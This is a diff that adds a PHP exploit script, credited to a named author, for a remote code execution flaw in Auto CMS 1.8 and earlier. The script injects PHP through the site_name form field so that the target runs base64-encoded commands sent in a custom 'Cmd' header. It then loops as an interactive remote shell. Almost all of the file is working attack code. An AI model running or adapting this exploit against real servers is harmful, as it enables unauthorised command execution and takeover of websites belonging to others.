@@ -1,0 +1,66 @@
+<?php
+/*
+=====================================
+Auto CMS <= 1.8 Remote Code Execution
+=====================================
+
+Author___: giudinvx
+Email____: <giudinvx[at]gmail[dot]com>
+Date_____: 10/31/2010
+Site_____: http://www.giudinvx.altervista.org/
+Site CMS_: http://ventics.com/autocms/
+*/
+
+error_reporting(0);
+set_time_limit(0);
+
+function openfsock ($host, $pack)
+{
+if (!($fp = fsockopen($host, 80))) {
+die("\nNo response\n");
+} else {
+fputs($fp, $pack);
+
+while (!feof($fp)) {
+$ret .= fgets($fp, 1024);
+}
+fclose($fp);
+}
+return $ret;
+}
+
+$host = $argv[1];
+$path = $argv[2];
+
+if ($argc < 3) {
+echo "\nExample: php $argv[0] lolcalhost /
+Example: php $argv[0] localhost /path/\n\n";
+die();
+}
+
+$excode =
+"update=WuaU&site_name=aZombie\\\');error_reporting(0);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die;//";
+$pack = "POST /test/autocms/ HTTP/1.1\r\n";
+$pack.= "Host: localhost\r\n";
+$pack.= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US;
+rv:1.8.1) Gecko/20061010 Firefox/2.0\r\n";
+$pack.= "Cmd: %s\r\n";
+$pack.= "Content-Length: ".strlen($excode)."\r\n";
+$pack.= "Content-Type: application/x-www-form-urlencoded\r\n";
+$pack.= "Connection: close\r\n\r\n";
+$pack.= $excode;
+
+echo "\nAuto CMS <= 1.8 Remote Code Execution
+Exploit by giudinvx";
+
+while (true) {
+echo "\nShellCMD\n";
+$cmd = trim(fgets(STDIN));
+ if ($cmd != ":q") {
+$res = openfsock($host, sprintf($pack, base64_encode($cmd)));
+preg_match("/(\n|.)*/i", $res, $match);
+echo $match[0];
+} else {
+die();
+}
+}
